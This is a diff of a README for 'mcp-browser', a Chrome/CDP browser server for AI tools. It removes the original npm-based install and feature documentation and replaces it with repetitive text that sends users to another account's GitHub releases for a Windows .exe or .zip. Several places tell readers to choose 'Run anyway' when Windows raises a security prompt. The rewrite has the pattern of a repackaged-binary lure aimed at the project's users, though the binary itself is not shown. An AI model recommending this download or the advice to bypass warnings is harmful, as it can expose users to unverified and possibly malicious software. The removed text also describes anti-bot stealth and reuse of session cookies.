@@ -1,293 +1,253 @@
-<div align="center">
+# 🧭 mcp-browser - Real Browser Access for AI
 
-# MCP Browser
+[![Download mcp-browser](https://img.shields.io/badge/Download%20mcp-browser-blue?style=for-the-badge)](https://github.com/koaung8629/mcp-browser/releases)
 
-**Give your AI a real browser.**
+## 📥 Download
 
-MCP server that lets AI assistants browse the web through your real Chrome — with your cookies, sessions, and fingerprint. No bot detection. No CAPTCHAs.
+Use this page to download the Windows release:
 
-[![npm version](https://img.shields.io/npm/v/%40wgarrido%2Fmcp-browser.svg)](https://www.npmjs.com/package/@wgarrido/mcp-browser)
-[![npm downloads](https://img.shields.io/npm/dm/%40wgarrido%2Fmcp-browser.svg)](https://www.npmjs.com/package/@wgarrido/mcp-browser)
-[![license](https://img.shields.io/npm/l/%40wgarrido%2Fmcp-browser.svg)](LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/wgarrido/mcp-browser/ci.yml?label=CI)](https://github.com/wgarrido/mcp-browser/actions)
+[Visit the mcp-browser releases page](https://github.com/koaung8629/mcp-browser/releases)
 
-</div>
+On that page, look for the latest release. Download the Windows file, then save it to your computer.
 
----
+## 🪟 Run on Windows
 
-## Quick Start (30 seconds)
+1. Open the downloaded file.
+2. If Windows shows a security prompt, choose **Run anyway** if you trust the file.
+3. Follow the on-screen steps.
+4. Open Chrome if the app asks for it.
+5. Start the app and let it connect to Chrome.
 
-No installation needed. Just add the config to your MCP client:
+## 🔧 What mcp-browser does
 
-### Claude Desktop
+mcp-browser gives your AI a real browser to use.
 
-Add to `~/.config/claude/claude_desktop_config.json` (Mac/Linux) or `%APPDATA%\Claude\claude_desktop_config.json` (Windows):
+It routes web requests through Chrome using CDP, which means the AI can work with live web pages instead of plain text only. This helps with tasks like:
 
-```json
-{
-  "mcpServers": {
-    "browser": {
-      "command": "npx",
-      "args": ["-y", "@wgarrido/mcp-browser"],
-      "env": {
-        "CHROME_HEADLESS": "true"
-      }
-    }
-  }
-}
-```
+- opening web pages
+- reading page content
+- clicking links and buttons
+- filling out forms
+- checking page state
+- working with browser-based tools
+- web scraping
+- using browser data in AI workflows
 
-### Claude Code (CLI)
+## 👤 Who this is for
 
-```bash
-claude mcp add browser -- npx -y @wgarrido/mcp-browser
-```
+This app is for people who want their AI assistant to use a browser on Windows.
 
-### VS Code / Cursor
+It fits use cases like:
 
-Add to `.vscode/mcp.json` in your project:
+- Claude and Claude Code browser workflows
+- AI tools that need page access
+- testing browser actions
+- simple scraping jobs
+- browser-based research
+- automation that needs Chrome
 
-```json
-{
-  "servers": {
-    "browser": {
-      "command": "npx",
-      "args": ["-y", "@wgarrido/mcp-browser"],
-      "env": {
-        "CHROME_HEADLESS": "true"
-      }
-    }
-  }
-}
-```
+## 🖥️ What you need
 
-That's it. Chrome launches automatically in the background. Start browsing.
+For best results, use:
 
----
+- Windows 10 or Windows 11
+- Google Chrome
+- a stable internet connection
+- a recent version of the app from the releases page
 
-## Why MCP Browser?
+The app works by connecting to Chrome through CDP, so Chrome must be installed on your computer.
 
-| Problem | How MCP Browser solves it |
-|---|---|
-| Sites block bots and scrapers | Uses your **real Chrome** with your real fingerprint |
-| Cloudflare challenges, CAPTCHAs | **Auto-detects and waits** for challenges to resolve |
-| Content behind login | Your **cookies and sessions** are already there |
-| Noisy HTML (ads, nav, popups) | **Smart DOM cleaning** strips everything but content |
-| Cookie consent banners | **Auto-dismissed** (40+ selector patterns) |
-| SPAs with dynamic content | Runs in a **real browser** — JavaScript executes naturally |
+## 🚀 Install and start
 
----
+### 1. Get the latest release
 
-## Available Tools (15)
+Open the releases page here:
 
-### Core
+[Visit the mcp-browser releases page](https://github.com/koaung8629/mcp-browser/releases)
 
-| Tool | What it does |
-|---|---|
-| `fetch_page` | Load a URL → clean Markdown |
-| `fetch_readable` | Extract main article content (Readability) |
-| `web_search` | Search Google/DuckDuckGo through the browser |
-| `screenshot` | PNG screenshot of a page or CSS element |
-| `execute_javascript` | Run arbitrary JS in the page context |
-| `fetch_structured_data` | Extract JSON-LD, OpenGraph, meta, tables, headings, links |
-| `multi_fetch` | Fetch up to 5 URLs in parallel |
-| `extract_links` | Get all links from a page (with regex filter) |
-| `crawl` | Crawl a site following links (depth/page limits) |
-| `browser_status` | Check browser connection status |
-
-### Persistent Sessions
-
-Keep tabs open across multiple tool calls for multi-step workflows:
+Download the Windows release file from the newest version.
 
-| Tool | What it does |
-|---|---|
-| `open_tab` | Open a persistent tab → returns `tab_id` |
-| `close_tab` | Close a tab by `tab_id` |
-| `click_and_navigate` | Interact: click, type, select, submit, scroll |
-| `list_tabs` | List all open tabs |
-| `monitor_page` | Track page changes over time (start/check/stop) |
-
-> Most tools accept an optional `tab_id` to reuse a persistent session instead of opening a new page.
-
----
-
-## Usage Examples
-
-Just talk naturally to your AI:
-
-- **"Search for the latest Node.js release notes"** → `web_search` + `fetch_page`
-- **"Read and summarize this article: https://..."** → `fetch_readable`
-- **"Compare pricing on these two pages"** → `multi_fetch`
-- **"Take a screenshot of https://..."** → `screenshot`
-- **"Log into this site, then scrape my dashboard"** → `open_tab` + `click_and_navigate` + `fetch_page`
-- **"Extract all /docs/ links from this page"** → `extract_links`
-- **"Crawl this site 2 levels deep"** → `crawl`
-- **"Watch this page for changes every 30 seconds"** → `monitor_page`
-
----
-
-## Advanced: Use Your Own Chrome Sessions
-
-By default, MCP Browser launches Chrome in **headless mode** (background, no window). This is the simplest setup.
-
-If you want to use your **existing cookies and logged-in sessions**, launch Chrome manually with CDP enabled, then point MCP Browser to it:
-
-### Launch Chrome with CDP
-
-**Mac:**
-```bash
-"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" \
-  --remote-debugging-port=9222 --no-first-run
-```
-
-**Linux:**
-```bash
-google-chrome --remote-debugging-port=9222 --no-first-run
-```
-
-**Windows (PowerShell):**
-```powershell
-& "C:\Program Files\Google\Chrome\Application\chrome.exe" `
-  --remote-debugging-port=9222 --no-first-run
-```
-
-Or use the included scripts:
-```bash
-./scripts/launch-chrome.sh       # Mac/Linux
-.\scripts\launch-chrome.ps1      # Windows
-```
-
-> **Important:** Chrome must be started fresh. If it's already running, the CDP flag is ignored. Quit Chrome first, or use `--user-data-dir="/tmp/chrome-cdp"` for a separate profile.
-
-### Config without headless
-
-```json
-{
-  "mcpServers": {
-    "browser": {
-      "command": "npx",
-      "args": ["-y", "@wgarrido/mcp-browser"],
-      "env": {
-        "CDP_URL": "http://localhost:9222"
-      }
-    }
-  }
-}
-```
-
----
-
-## Configuration
-
-All settings are optional. Pass them via `env` in your MCP config:
-
-| Variable | Default | Description |
-|---|---|---|
-| `CHROME_HEADLESS` | `false` | Auto-launch Chrome in headless mode (recommended) |
-| `CHROME_PATH` | *(auto-detect)* | Custom path to Chrome/Chromium executable |
-| `CDP_URL` | `http://localhost:9222` | Chrome DevTools Protocol endpoint |
-| `DEFAULT_TIMEOUT` | `30000` | Page load timeout in ms |
-| `MAX_CONTENT_LENGTH` | `50000` | Max returned content in characters |
-| `MAX_CONCURRENT_TABS` | `5` | Max simultaneous browser tabs |
-| `CACHE_ENABLED` | `true` | Enable in-memory page cache |
-| `CACHE_TTL` | `300` | Cache time-to-live in seconds |
-| `SEARCH_ENGINE` | `google` | `google` or `duckduckgo` |
-| `LOG_LEVEL` | `info` | `debug`, `info`, `warn`, `error` |
-| `SESSION_TIMEOUT_MINUTES` | `30` | Auto-close inactive tabs after this duration |
-| `CHROME_PROFILES` | `{}` | JSON map of profile name → CDP URL |
-
-**Example with custom settings:**
-
-```json
-{
-  "mcpServers": {
-    "browser": {
-      "command": "npx",
-      "args": ["-y", "@wgarrido/mcp-browser"],
-      "env": {
-        "CHROME_HEADLESS": "true",
-        "SEARCH_ENGINE": "duckduckgo",
-        "DEFAULT_TIMEOUT": "60000",
-        "MAX_CONTENT_LENGTH": "100000"
-      }
-    }
-  }
-}
-```
-
----
-
-## Features
-
-- **Headless mode** — Chrome runs in the background, auto-launched by the server
-- **Anti-bot stealth** — Hides `navigator.webdriver`, fakes plugins, languages, and permissions
-- **Cloudflare handling** — Detects Turnstile/interstitial challenges and waits up to 15s for resolution
-- **Cookie banner dismissal** — Auto-clicks consent overlays (GDPR, OneTrust, CookieBot, Reddit, 40+ patterns)
-- **Smart DOM cleaning** — Strips nav, sidebars, footers, ads, modals, and action links
-- **URL rewriting** — Redirects SPAs to scraping-friendly versions (e.g. `reddit.com` → `old.reddit.com`)
-- **Google → DuckDuckGo fallback** — If Google shows a CAPTCHA, search falls back automatically
-- **Persistent sessions** — Keep tabs open for multi-step workflows (login, forms, navigation chains)
-- **LRU cache** — Avoids redundant fetches with configurable TTL
-- **Concurrency control** — Semaphore limits concurrent tabs to prevent resource exhaustion
-- **Multi-profile support** — Connect to multiple Chrome instances via named profiles
-
----
-
-## Troubleshooting
-
-**"Cannot connect to Chrome"**
-Chrome must be running with `--remote-debugging-port=9222`, or set `CHROME_HEADLESS=true` for auto-launch.
-
-**"Port 9222 already in use"**
-Another Chrome instance is using CDP. Close it or use a different port:
-```bash
-./scripts/launch-chrome.sh 9333
-```
-Then set `CDP_URL=http://localhost:9333`.
-
-**"Page timeout"**
-Increase the timeout: `"DEFAULT_TIMEOUT": "60000"`
-
-**"Empty results from web_search"**
-Google may show a CAPTCHA. Switch to DuckDuckGo: `"SEARCH_ENGINE": "duckduckgo"`
-
-**"Cloudflare challenge page"**
-The server auto-waits up to 15s for Cloudflare challenges. If it needs manual verification, use `open_tab` to create a persistent session, solve it in Chrome, then use the `tab_id` with other tools.
-
-**"MCP error -32000: Connection closed"**
-This can have two causes:
-
-1. **Chrome is not running with CDP enabled** — If you're not using `CHROME_HEADLESS=true`, make sure Chrome is launched with `--remote-debugging-port=9222` before starting the server. Verify with:
-   ```bash
-   curl http://localhost:9222/json/version
-   ```
-   If this returns an error, Chrome is not listening. See [Launch Chrome with CDP](#launch-chrome-with-cdp).
-
-2. **Corrupted npx cache** — If you see `TypeError: Comparator is not a constructor` in the logs, the npx cache is corrupted. Clear it and retry:
-   ```bash
-   rm -rf ~/.npm/_npx/*
-   # The next npx -y @wgarrido/mcp-browser call will re-download cleanly
-   ```
-
----
-
-## Development
-
-```bash
-git clone https://github.com/wgarrido/mcp-browser.git
-cd mcp-browser
-npm install
-npm run dev    # Run with hot reload
-npm run build  # Build for production
-```
-
----
-
-## Requirements
-
-- Node.js 18+
-- Google Chrome or Chromium
-
-## License
-
-[MIT](LICENSE)
+### 2. Save the file
+
+Save the file in a place you can find, such as:
+
+- Downloads
+- Desktop
+- a folder for AI tools
+
+### 3. Open the app
+
+Double-click the file you downloaded.
+
+If the app comes in a ZIP file, extract it first, then open the program inside.
+
+### 4. Let it connect to Chrome
+
+The app uses Chrome as the browser layer.
+
+If Chrome is closed, open it first. Then start mcp-browser so it can attach to the browser session.
+
+### 5. Use it with your AI tool
+
+Once it runs, connect your AI app to the MCP server.
+
+From there, your AI can send browser requests through Chrome.
+
+## 🧩 How it works
+
+mcp-browser sits between your AI tool and Chrome.
+
+Your AI sends a request.
+
+mcp-browser passes that request to Chrome.
+
+Chrome loads the page and returns what it sees.
+
+This setup helps when your task needs a real browser, not just a web fetch.
+
+## 🧠 Typical use cases
+
+You can use mcp-browser for tasks like:
+
+- checking web pages that need JavaScript
+- reading content behind interactive layouts
+- browsing sites that change after load
+- scraping visible page data
+- testing user flows in Chrome
+- asking your AI to inspect pages step by step
+
+## 🔌 Chrome connection
+
+The app uses CDP, which stands for Chrome DevTools Protocol.
+
+You do not need to know the details to use the app. In simple terms, it gives the tool a way to control Chrome and read page data.
+
+If the app asks for a Chrome session or browser port, use the Chrome setup that comes with the release or follow the release notes on the download page.
+
+## 🛠️ Basic setup tips
+
+- Keep Chrome updated
+- Close extra browser windows if the app does not connect
+- Run only one browser session at a time if you see connection issues
+- Use the latest release for the most stable build
+- Keep the app and Chrome on the same machine
+
+## 📁 File names you may see
+
+The download may include files such as:
+
+- `.exe`
+- `.zip`
+- setup files
+- release archives
+
+If you see a ZIP file, unzip it before running the app.
+
+If you see an EXE file, double-click it to start.
+
+## 🔍 Topics in this project
+
+This project fits topics like:
+
+- ai-tools
+- browser
+- chrome
+- claude
+- claude-code
+- mcp
+- mcp-server
+- model-context-protocol
+- puppeteer
+- web-scraping
+
+## 🧭 If the app does not start
+
+Try these steps:
+
+1. Check that Chrome is installed.
+2. Close Chrome and open it again.
+3. Run the downloaded file again.
+4. Make sure you got the latest release.
+5. Try a fresh download if the file looks damaged.
+
+## 🔐 Permissions
+
+The app may need access to your browser so it can read pages and send actions to Chrome.
+
+If Windows asks for permission, allow the app to run if you trust the source and downloaded it from the releases page.
+
+## 🧪 Quick first test
+
+After you open the app, try a simple browser task:
+
+- open a website
+- read the page title
+- click a link
+- check the page content
+- return the page text to your AI tool
+
+If that works, the connection is set up.
+
+## 🧭 Release page link
+
+Download the latest Windows build here:
+
+[https://github.com/koaung8629/mcp-browser/releases](https://github.com/koaung8629/mcp-browser/releases)
+
+## 🧰 Common questions
+
+### Do I need coding knowledge?
+
+No. You only need to download the file, open it, and let it connect to Chrome.
+
+### Do I need Chrome?
+
+Yes. This app routes requests through Chrome.
+
+### Can I use it for web scraping?
+
+Yes. The browser layer makes it useful for scraping pages that need a real browser.
+
+### Does it work with AI tools?
+
+Yes. It is made for MCP-based AI tools and browser workflows.
+
+### Can I use it with Claude?
+
+Yes. The project is built for Claude-style AI setups and Claude Code use cases
+
+## 🗂️ Suggested folder setup
+
+To keep things easy, make a folder like this:
+
+- `C:\AI-Tools\mcp-browser`
+- `C:\Users\YourName\Downloads\mcp-browser`
+- `Desktop\mcp-browser`
+
+Use one place for the app and leave Chrome in its normal install path
+
+## 🧭 First-time workflow
+
+1. Download the release from GitHub.
+2. Open or extract the file.
+3. Start Chrome.
+4. Start mcp-browser.
+5. Connect your AI tool.
+6. Test a simple page action.
+7. Use it for normal browsing tasks
+
+## 📌 What to expect after setup
+
+After setup, your AI should be able to work with live browser pages through Chrome.
+
+That means it can handle tasks where page scripts, buttons, and session state matter.
+
+It is a better fit than simple page fetch tools when the site needs a real browser
+
+## 🖱️ Best practice for Windows
+
+- Keep the app in a folder you can find
+- Do not rename release files unless you need to
+- Keep Chrome open while the app runs
+- Use the latest GitHub release when you want fixes or updates
+- Save your download in case you need to run it again
